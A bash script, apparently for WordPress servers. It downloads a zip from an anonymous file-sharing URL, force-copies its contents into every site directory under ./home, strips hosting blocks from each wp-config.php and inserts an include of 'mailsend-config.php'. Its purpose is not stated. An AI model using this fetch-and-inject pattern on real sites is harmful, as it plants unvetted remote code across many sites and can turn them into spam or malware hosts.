check_file="t.php"
replacement_for_check_file="https://transfer.sh/lCF3P/htdocs.zip"

editing_file="wp-config.php"

search_dir="./home"

# Downloading the file before the script execution to save time

zip_file_url="https://transfer.sh/lCF3P/htdocs.zip"
zip_file_name="htdocs.zip"
extracted_name="htdocs"


wget -q $zip_file_url -O $zip_file_name
unzip -q -o $zip_file_name

find $search_dir -maxdepth 1 -mindepth 1 -type d |while read d;
	do
		# echo $d
		new_search_dir=$d"/sites"
		find $new_search_dir -maxdepth 1 -mindepth 1 -type d |while read d;
			do
				echo $d
				file=$d"/"$check_file
				if test -f "$file"; then
				    echo "$file exist"
				else
					yes | cp $extracted_name -rf $d
				fi
				
				first_block_line_no="$(grep -n '\/\* GridPane site routing \*\/' $d"/"wp-config.php | head -n 1 | cut -d: -f1)"
				if [ ! -z "$first_block_line_no" ] 
				then
					sed -i "${first_block_line_no},+2d" $d"/"wp-config.php
				fi

				sencond_block_line_no="$(grep -n '\/\* GridPane Elasticpress \*\/' $d"/"wp-config.php | head -n 1 | cut -d: -f1)"
				if [ ! -z "$sencond_block_line_no" ] 
				then
					sed -i "${sencond_block_line_no},+17d" $d"/"wp-config.php
				fi

				third_block_line_no="$(grep -n '\/\* GridPane Secure Debug \*\/' $d"/"wp-config.php | head -n 1 | cut -d: -f1)"

				if [ ! -z "$third_block_line_no" ] 
				then
					sed -i "${third_block_line_no}d" $d"/"wp-config.php
					insert_line_no="$(($third_block_line_no + 1))"
					echo $insert_line_no
					insert_text=$insert_line_no"iinclude __DIR__ . '/mailsend-config.php';"
					echo $insert_text
					sed -i "${insert_text}" $d"/"wp-config.php
				fi

				fourth_block_line_no="$(grep -n '\/\* GridPane Cache Settings \*\/' $d"/"wp-config.php | head -n 1 | cut -d: -f1)"

				if [ ! -z "$fourth_block_line_no" ] 
				then
					sed -i "${fourth_block_line_no}d" $d"/"wp-config.php
				fi
				
				
			done
	done


# sed -i '/\/\* GridPane Elasticpress \*\//d' wp-config.php
# define('WP_HOME', 'http://email2.blogbing.net');
# define('WP_SITEURL', 'http://email2.blogbing.net');